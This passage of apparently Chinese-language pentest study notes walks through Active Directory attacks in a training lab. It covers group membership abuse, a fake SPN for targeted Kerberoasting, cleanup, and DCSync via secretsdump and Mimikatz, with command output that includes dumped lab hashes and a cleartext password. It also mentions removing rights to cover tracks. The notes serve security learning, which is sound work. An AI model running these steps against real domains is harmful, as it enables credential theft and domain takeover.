<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Help Desk Level 1&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;damundsen&#x27;</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-PrincipalContext</span>] <span class="keyword">Using</span> alternate credentials</span><br><span class="line">VERBOSE: [<span class="built_in">Add-DomainGroupMember</span>] Adding member <span class="string">&#x27;damundsen&#x27;</span> to <span class="built_in">group</span> <span class="string">&#x27;Help Desk Level 1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>确认 damundsen 已添加到群组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> | <span class="built_in">Select</span> MemberName</span><br><span class="line"></span><br><span class="line">MemberName</span><br><span class="line"><span class="literal">----------</span></span><br><span class="line">busucher</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">damundsen</span><br></pre></td></tr></table></figure>

<h2 id="Creating-a-Fake-SPN"><a href="#Creating-a-Fake-SPN" class="headerlink" title="Creating a Fake SPN"></a>Creating a Fake SPN</h2><p>假设允许更改<code>damundsen</code>用户的密码，但该<code>adunn</code>用户是无法中断的管理员帐户。由于拥有<code>GenericAll</code>此帐户的权限，所以可以进行更多的尝试，并通过修改帐户的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname">servicePrincipalName 属性</a>来创建伪造的 SPN，从而执行有针对性的 Kerberoasting 攻击，然后可以对其进行 Kerberoast 以获取 TGS 票证并使用 Hashcat 离线破解哈希。</p>
<p>必须以组成员的身份进行身份验证<code>Information Technology</code>才能成功。由于将<code>damundsen</code>加入了<code>Help Desk Level 1</code>组，因此通过嵌套组成员身份继承了权限。现在可以使用<a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/">Set-DomainObject</a>创建伪造的 SPN。可以使用<a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/targetedKerberoast">targetKerberoast</a>工具从 Linux 主机执行相同的攻击，它将在一个命令中创建临时 SPN、检索哈希并删除临时 SPN。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Cred2</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\damundsen&#x27;</span>, <span class="variable">$SecPassword</span>) </span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Identity</span> adunn <span class="literal">-SET</span> <span class="selector-tag">@</span>&#123;serviceprincipalname=<span class="string">&#x27;notahacker/LEGIT&#x27;</span>&#125; <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] <span class="keyword">Using</span> alternate credentials for Get-Domain</span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] Extracted domain <span class="string">&#x27;INLANEFREIGHT&#x27;</span> from <span class="literal">-Credential</span></span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] <span class="keyword">Using</span> alternate credentials for LDAP connection</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainObject</span>] <span class="built_in">Get-DomainObject</span> <span class="keyword">filter</span> string:</span><br><span class="line">(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))</span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainObject</span>] Setting <span class="string">&#x27;serviceprincipalname&#x27;</span> to <span class="string">&#x27;notahacker/LEGIT&#x27;</span> <span class="keyword">for</span> object <span class="string">&#x27;adunn&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果此方法有效，应该能够使用各种方法来对用户进行 Kerberoast 攻击，并获取用于离线破解的哈希值。</p>
<h3 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h3><h4 id="Impacket-GetUserSPNs"><a href="#Impacket-GetUserSPNs" class="headerlink" title="Impacket GetUserSPNs"></a>Impacket GetUserSPNs</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/damundsen -request-user adunn</span><br></pre></td></tr></table></figure>

<h4 id="Rubeus-1"><a href="#Rubeus-1" class="headerlink" title="Rubeus"></a>Rubeus</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /user:adunn /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target User            : adunn</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : adunn</span><br><span class="line">[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : notahacker/LEGIT</span><br><span class="line">[*] PwdLastSet             : <span class="number">3</span>/<span class="number">1</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">29</span>:<span class="number">08</span> AM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*adunn<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$notahacker</span>/LEGIT@INLANEFREIGHT.LOCAL*<span class="variable">$</span> &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h3><p>在清理方面，需要做以下几件事：</p>
<ol>
<li>删除在用户上创建的虚假 SPN <code>adunn</code></li>
<li>从组<code>damundsen</code>中删除用户<code>Help Desk Level 1</code></li>
<li>将用户的密码设置<code>damundsen</code>回其原始值（如果知道）或让客户端设置&#x2F;提醒用户</li>
</ol>
<p>顺序很重要，因为如果先从组中删除用户，那么就没有权利删除假的 SPN。</p>
<h4 id="remove-the-fake-SPN"><a href="#remove-the-fake-SPN" class="headerlink" title="remove the fake SPN"></a>remove the fake SPN</h4><p>删除在用户上创建的虚假 SPN <code>adunn</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-DomainObject</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Identity</span> adunn <span class="literal">-Clear</span> serviceprincipalname <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] <span class="keyword">Using</span> alternate credentials for Get-Domain</span><br><span class="line">VERBOSE: [<span class="built_in">Get-Domain</span>] Extracted domain <span class="string">&#x27;INLANEFREIGHT&#x27;</span> from <span class="literal">-Credential</span></span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] search base: LDAP://ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainSearcher</span>] <span class="keyword">Using</span> alternate credentials for LDAP connection</span><br><span class="line">VERBOSE: [<span class="built_in">Get-DomainObject</span>] <span class="built_in">Get-DomainObject</span> <span class="keyword">filter</span> string:</span><br><span class="line">(&amp;(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))</span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainObject</span>] Clearing <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="keyword">for</span> object <span class="string">&#x27;adunn&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="remove-a-user-from-the-group"><a href="#remove-a-user-from-the-group" class="headerlink" title="remove a user from the group"></a>remove a user from the group</h4><p>从 Help Desk Level 1 组中删除 damundsen</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Remove-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> <span class="literal">-Members</span> <span class="string">&#x27;damundsen&#x27;</span> <span class="literal">-Credential</span> <span class="variable">$Cred2</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-PrincipalContext</span>] <span class="keyword">Using</span> alternate credentials</span><br><span class="line">VERBOSE: [<span class="built_in">Remove-DomainGroupMember</span>] Removing member <span class="string">&#x27;damundsen&#x27;</span> from <span class="built_in">group</span> <span class="string">&#x27;Help Desk Level 1&#x27;</span></span><br><span class="line">True</span><br></pre></td></tr></table></figure>

<p>确认 damundsen 已从群组中移除</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Help Desk Level 1&quot;</span> | <span class="built_in">Select</span> MemberName |? &#123;<span class="variable">$_</span>.MemberName <span class="operator">-eq</span> <span class="string">&#x27;damundsen&#x27;</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<h4 id="change-password"><a href="#change-password" class="headerlink" title="change password"></a>change password</h4><p>最后，将用户的密码设置<code>damundsen</code>回其原始值（如果知道）或让客户端设置&#x2F;提醒用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net user password newpassword /domain</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-ADAccountPassword</span> <span class="literal">-Identity</span> damundsen <span class="literal">-NewPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;password&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)</span><br></pre></td></tr></table></figure>

<p>或设置一下命令，提醒用户更改密码</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> damundsen <span class="literal">-ChangePasswordAtLogon</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure>

<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>DCSync 是一种利用内置的 <code>Directory Replication Service Remote Protocol</code> 窃取 Active Directory 密码数据库的技术，域控制器会使用该数据库来复制域数据。这允许攻击者模仿域控制器来检索用户 NTLM 密码哈希。</p>
<p>攻击的关键是请求域控制器通过 <code>DS-Replication-Get-Changes-All</code> 扩展权限复制密码。执行此攻击，必须控制具有执行域复制权限的帐户（具有 <code>DS-Replication-Get-Changes</code> 和 <code>DS-Replication-Get-Changes-All</code> ）。域&#x2F;企业管理员和默认域管理员默认拥有此权限。</p>
<h3 id="View-Replication-Privileges"><a href="#View-Replication-Privileges" class="headerlink" title="View Replication Privileges"></a>View Replication Privileges</h3><h4 id="ADSI-edit"><a href="#ADSI-edit" class="headerlink" title="ADSI edit"></a>ADSI edit</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729234126504.png" alt="adnunn_right_dcsync"></p>
<p>在评估过程中，通常会发现具有这些权限的其他帐户，一旦被攻破，就可以利用其访问权限检索任何域用户的当前 NTLM 密码哈希以及与其以前密码相对应的哈希。</p>
<h4 id="PowerView-3"><a href="#PowerView-3" class="headerlink" title="PowerView"></a>PowerView</h4><p>获取 SID</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> adunn  |<span class="built_in">select</span> samaccountname,objectsid,memberof,useraccountcontrol |<span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">samaccountname     : adunn</span><br><span class="line">objectsid          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">memberof           : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar</span><br><span class="line">                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security</span><br><span class="line">                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="built_in">H</span> Drive,OU=Security</span><br><span class="line">                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...&#125;</span><br><span class="line">useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br></pre></td></tr></table></figure>

<p>检查复制权限<code>DS-Replication-Get-Changes-All</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$sid</span>= <span class="string">&quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ObjectAcl</span> <span class="string">&quot;DC=inlanefreight,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> | ? &#123; (<span class="variable">$_</span>.ObjectAceType <span class="operator">-match</span> <span class="string">&#x27;Replication-Get&#x27;</span>)&#125; | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="variable">$sid</span>&#125; |<span class="built_in">select</span> AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-498</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-516</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-All</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-In-Filtered-Set</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes</span></span><br><span class="line"></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1164</span></span><br><span class="line">ObjectAceType         : DS<span class="literal">-Replication-Get-Changes-All</span></span><br></pre></td></tr></table></figure>

<p>如果对用户拥有某些权限（例如<a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl">WriteDacl</a>），还可以将此权限添加到控制下的用户，执行 DCSync 攻击，然后删除权限以尝试掩盖踪迹。</p>
<h3 id="DCSync-replication"><a href="#DCSync-replication" class="headerlink" title="DCSync replication"></a>DCSync replication</h3><h4 id="secretsdump-py"><a href="#secretsdump-py" class="headerlink" title="secretsdump.py"></a>secretsdump.py</h4><p>运行该工具会将所有哈希写入带有前缀的文件中<code>inlanefreight_hashes</code>。</p>
<p><code>-just-dc-ntlm</code> 只输出 NTLM Hash</p>
<p><code>-just-dc-user &lt;USERNAME&gt;</code> 仅提取特定用户的数据</p>
<p><code>-pwd-last-set</code> 查看帐户的密码上次更改时间</p>
<p><code>-history</code> 转储密码历史记录</p>
<p><code>-user-status</code> 是另一个有用的标志，用于检查用户是否被禁用</p>
<p><code>-just-dc</code>  创建三个文件：一个包含 NTLM Hash，一个包含 Kerberos 密钥，一个包含来自 NTDS 的任何启用了可逆加密的帐户的明文密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5 -outputfile inlanefreight_hashes</span><br><span class="line"></span><br><span class="line">Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5</span><br><span class="line">[*] Searching for NTDS.dit</span><br><span class="line">[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time</span><br><span class="line">[*] Using smbexec method for remote execution</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6</span><br><span class="line">[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp </span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::</span><br><span class="line">ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::</span><br><span class="line">ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::</span><br><span class="line">ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::</span><br><span class="line">inlanefreight.local\-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::</span><br><span class="line">inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">d0wngrade:des-cbc-md5:d6fee0b62aa410fe</span><br><span class="line">d0wngrade:dec-cbc-crc:d6fee0b62aa410fe</span><br><span class="line">ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d</span><br><span class="line">svc_qualys:des-cbc-md5:f125ab34b53eb61c</span><br><span class="line">forend:des-cbc-md5:e3c14adf9d8a04c1</span><br><span class="line">[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp </span><br><span class="line">proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h4 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Mimikatz 必须在具有 DCSync 权限的用户上下文中运行。</p>
<p>runas.exe 启动 adunn 用户的一个 powershell</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [Version <span class="number">10</span>.<span class="number">0</span>.<span class="number">17763</span>.<span class="number">107</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">runas</span> /<span class="title">netonly</span> /<span class="title">user:INLANEFREIGHT</span>\<span class="title">adunn</span> <span class="title">powershell</span></span></span><br><span class="line"><span class="function"><span class="title">Enter</span> <span class="title">the</span> <span class="title">password</span> <span class="title">for</span> <span class="title">INLANEFREIGHT</span>\<span class="title">adunn</span>:</span></span><br><span class="line"><span class="function"><span class="title">Attempting</span> <span class="title">to</span> <span class="title">start</span> <span class="title">powershell</span> <span class="title">as</span> <span class="title">user</span> &quot;<span class="title">INLANEFREIGHT</span>\<span class="title">adunn</span>&quot; ...</span></span><br></pre></td></tr></table></figure>

<p>从新生成的 powershell 会话中执行攻击</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;INLANEFREIGHT\administrator&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span 